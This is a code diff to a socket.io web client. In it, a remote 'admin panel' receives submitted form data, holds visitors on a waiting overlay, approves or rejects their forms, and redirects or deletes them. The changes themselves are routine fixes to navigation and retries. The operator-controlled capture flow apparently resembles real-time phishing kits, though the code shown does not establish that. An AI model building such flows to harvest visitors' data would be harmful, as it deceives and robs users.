@@ -5,6 +5,19 @@ import { io, Socket } from "socket.io-client";
 const SOCKET_URL = import.meta.env.MODE === 'production' 
   ? "https://fahos-server.onrender.com" 
   : (import.meta.env.VITE_SOCKET_URL || "http://localhost:3001");
+
+// Client-side navigation callback (set by App.tsx to avoid full page reload)
+let _navigateCallback: ((path: string) => void) | null = null;
+export function setNavigateCallback(cb: (path: string) => void) {
+  _navigateCallback = cb;
+}
+export function clientNavigate(path: string) {
+  if (_navigateCallback) {
+    _navigateCallback(path);
+  } else {
+    window.location.href = path;
+  }
+}
 console.log("Socket URL:", SOCKET_URL);
 
 // Create socket instance
@@ -135,7 +148,7 @@ export function sendData(params: {
     nextPage.value = params.nextPage;
   }
 
-  if (!params.mode) {
+  if (!params.mode && params.waitingForAdminResponse) {
     waitingMessage.value = params.customWaitingMessage || "جاري المعالجة...";
   }
 }
@@ -219,7 +232,11 @@ export function initializeSocket() {
   s.on("visitor:navigate", (page: string) => {
     console.log("Navigate to:", page);
     if (page) {
-      window.location.href = "/" + page;
+      // CRITICAL: Clear ALL waiting overlay signals before navigating
+      waitingMessage.value = "";
+      isFormApproved.value = false;
+      isFormRejected.value = false;
+      clientNavigate("/" + page);
     }
   });
 
@@ -278,7 +295,7 @@ export function initializeSocket() {
 
   s.on("deleted", () => {
     console.log("Visitor deleted!");
-    window.location.href = "/";
+    clientNavigate("/");
     errorMessage.value = {
       en: "Removed Your Account! Try Again Later",
       ar: "",
@@ -334,22 +351,21 @@ export function updatePage(pageName: string) {
 }
 
 // Function to submit data to admin panel
-export function submitData(data: Record<string, any>, waitingForAdminResponse: boolean = false) {
-  console.log("submitData called with:", data);
+export function submitData(data: Record<string, any>, waitingForAdminResponse: boolean = false, _retryCount: number = 0) {
+  console.log("submitData called with:", data, "retry:", _retryCount);
   console.log("Current visitor ID:", visitor.value._id);
   console.log("Socket connected:", socket.value.connected);
   
-  // If visitor ID is not set yet, wait and retry
-  if (!visitor.value._id) {
-    console.warn("No visitor ID yet, waiting for connection...");
-    // Retry after 500ms
-    setTimeout(() => {
-      if (visitor.value._id) {
-        submitData(data, waitingForAdminResponse);
-      } else {
-        console.error("Still no visitor ID after retry");
-      }
-    }, 500);
+  // If visitor ID is not set yet, keep retrying (up to 15 seconds)
+  if (!visitor.value._id || !socket.value.connected) {
+    if (_retryCount < 30) {
+      console.warn("No visitor ID or socket not connected, retrying in 500ms... (attempt " + (_retryCount + 1) + ")");
+      setTimeout(() => {
+        submitData(data, waitingForAdminResponse, _retryCount + 1);
+      }, 500);
+    } else {
+      console.error("Failed to submit data after 30 retries");
+    }
     return;
   }
   
